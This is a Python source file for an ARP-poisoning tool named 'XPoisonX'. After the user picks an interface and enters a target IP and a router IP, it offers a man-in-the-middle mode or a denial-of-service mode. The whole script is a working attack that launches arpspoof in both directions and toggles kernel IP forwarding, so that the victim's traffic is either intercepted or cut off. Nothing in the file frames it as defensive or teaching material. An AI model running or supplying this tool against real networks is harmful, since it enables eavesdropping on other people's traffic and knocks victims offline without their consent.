import subprocess
import os
import sys
import time
from colorama import Fore, Style, init
from pyfiglet import figlet_format

init(autoreset=True)



def execute_command(command):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()
    return process.returncode, output.decode(), error.decode()



def list_interfaces():
    print(f"{Fore.YELLOW}\n [!] Getting network interfaces...\n")
    code, output, _ = execute_command(["ip", "link", "show"])
    interfaces = []
    for line in output.splitlines():
        if ": " in line and not line.startswith(" "):
            iface = line.split(": ")[1].split("@")[0]
            if iface != "lo":
                interfaces.append(iface)
    return interfaces



def select_interface(interfaces):
    print(f"{Fore.CYAN} [*] Available Interfaces:\n")
    for i, iface in enumerate(interfaces):
        print(f"{Fore.GREEN}[{i}] {iface}")
    while True:
        try:
            choice = int(input(f"\n{Fore.CYAN} [*] select network interface: "))
            if 0 <= choice < len(interfaces):
                return  interfaces[choice]
        except ValueError:
            pass
        print(f"{Fore.RED} [!] invalid selection! try again.")



def set_ip_forwarding(state: bool):
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1' if state else '0')



def start_arpspoof(interface, target_ip, gateway_ip, attack_type):
    print(f"{Fore.YELLOW} [+] Starting {attack_type}...\n")

    proc1 = subprocess.Popen(
        ["arpspoof", "-i", interface, "-t", target_ip, gateway_ip],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    proc2 = subprocess.Popen(
        ["arpspoof", "-i", interface, "-t", gateway_ip, target_ip],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    if attack_type == "MITM attack":
        print(f"{Fore.GREEN} [+] ARP spoofing started between {target_ip} <-> {gateway_ip}\n")
    else:
        print(f"{Fore.GREEN} [+] DoS attack started on target ->{target_ip}<-\n")

    print(f"{Fore.MAGENTA} [CTRL+C] to stop the attack.\n")
    
    start_time = time.time()
    packet_count = 0

    try:
        while True:
            time.sleep(1)
            packet_count += 2
            elapsed = int(time.time() - start_time)
            print(f"{Fore.CYAN} [*] Elapsed: {elapsed} sec | Packets sent: {packet_count}", end="\r")

    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Stopping spoofing processes...")
        proc1.terminate()
        proc2.terminate()
        sys.exit()



def main():
    os.system("clear" if os.name != "nt" else "cls")
    print(f"{Fore.GREEN}{figlet_format('  XPoisonX')}")
    print(f"{Fore.GREEN}                                                   Created by Syntax\n")

    print(f"{Fore.GREEN}        [1] MITM ATTACK")
    print(f"{Fore.GREEN}        [2] DOS ATTACK")
    print()
    print()

    while True:
        choice = input(f"{Fore.CYAN} []> selection: ")
        if choice in ["1", "2"]:
            break
        print(f"{Fore.RED} [!] invalid selection!")

    forward_enabled = True if choice == "1" else False
    attack_type = "MITM attack" if choice == "1" else "DoS attack"

    interfaces = list_interfaces()
    selected_iface = select_interface(interfaces)
    target_ip = input(f"{Fore.CYAN} [*] Target IP: ")
    gateway_ip = input(f"{Fore.CYAN} [*] Router IP: ")

    set_ip_forwarding(forward_enabled)
    start_arpspoof(selected_iface, target_ip, gateway_ip, attack_type)



if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Ctrl-c detected! exiting...")
        sys.exit()